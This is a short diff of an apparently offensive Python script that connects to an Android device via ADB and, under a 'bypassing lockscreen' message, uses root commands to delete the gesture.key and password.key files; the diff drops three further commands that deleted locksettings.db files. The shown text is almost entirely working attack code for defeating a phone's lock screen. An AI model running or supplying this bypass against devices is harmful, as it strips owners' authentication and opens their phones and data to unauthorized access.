@@ -126,9 +126,6 @@ try:
         print("[+] connected to device")
         print("[+] bypassing lockscreen...\n")
         os.system(f"{ADB_PATH} shell 'su -c rm /data/system/gesture.key'")
-        os.system(f"{ADB_PATH} shell 'su -c rm /data/system/locksettings.db'")
-        os.system(f"{ADB_PATH} shell 'su -c rm /data/system/locksettings.db-shm'")
-        os.system(f"{ADB_PATH} shell 'su -c rm /data/system/locksettings.db-wal'")
         os.system(f"{ADB_PATH} shell 'su -c rm /data/system/password.key'")
         print_green("[+] done")
     else:
